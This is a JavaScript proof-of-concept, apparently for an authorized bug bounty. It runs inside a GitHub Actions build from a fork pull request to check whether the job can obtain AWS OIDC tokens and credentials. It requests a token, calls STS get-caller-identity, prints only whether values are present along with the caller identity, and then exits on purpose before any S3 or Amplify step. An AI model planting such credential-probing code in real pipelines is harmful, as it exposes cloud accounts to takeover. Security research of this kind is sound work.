/*
 * Bugcrowd JET program - authorized, read-only security research proof.
 * This file is part of a deliberately failing build step used to determine whether
 * a fork pull request can obtain an AWS OIDC token / temporary credentials in the
 * pie-aperture `pull_request` workflow. It performs only:
 *   - presence checks for env vars (no values printed)
 *   - a read-only STS GetCallerIdentity call
 *   - an OIDC token request where only a boolean "received" is printed
 * It then exits non-zero on purpose so the workflow stops BEFORE any S3 upload,
 * Amplify branch/deployment, or domain-association step can run.
 */
const { execSync } = require('child_process');

function present(v) { return !!v && String(v).length > 0; }

console.log('PROOF: event=' + (process.env.GITHUB_EVENT_NAME || ''));
console.log('PROOF: repository=' + (process.env.GITHUB_REPOSITORY || '') + ' ref=' + (process.env.GITHUB_REF || '') + ' head_ref=' + (process.env.GITHUB_HEAD_REF || ''));
console.log('PROOF: oidc_request_url_present=' + present(process.env.ACTIONS_ID_TOKEN_REQUEST_URL));
console.log('PROOF: oidc_request_token_present=' + present(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN));
console.log('PROOF: aws_access_key_id_present=' + present(process.env.AWS_ACCESS_KEY_ID));
console.log('PROOF: aws_secret_access_key_present=' + present(process.env.AWS_SECRET_ACCESS_KEY));
console.log('PROOF: aws_session_token_present=' + present(process.env.AWS_SESSION_TOKEN));

(async () => {
  const u = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (u && t) {
    try {
      const r = await fetch(u + '&audience=sts.amazonaws.com', { headers: { Authorization: 'bearer ' + t } });
      const body = await r.text();
      let hasValue = false;
      try { hasValue = !!JSON.parse(body).value; } catch (e) {}
      console.log('PROOF: oidc_token_http_status=' + r.status + ' oidc_token_received=' + hasValue);
    } catch (e) {
      console.log('PROOF: oidc_token_request_error=' + e.message);
    }
  }

  try {
    const out = execSync('aws sts get-caller-identity --output json --region eu-west-1', { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
    console.log('PROOF: get_caller_identity=' + out.replace(/\s+/g, ' ').trim());
  } catch (e) {
    const err = String(e.stderr || e.message || '').replace(/\s+/g, ' ').slice(0, 400);
    console.log('PROOF: get_caller_identity_failed status=' + (e.status === undefined ? 'n/a' : e.status) + ' error=' + err);
  }

  console.error('PROOF: deliberately exiting non-zero now to prevent any S3/Amplify write step from running');
  process.exit(1);
})();
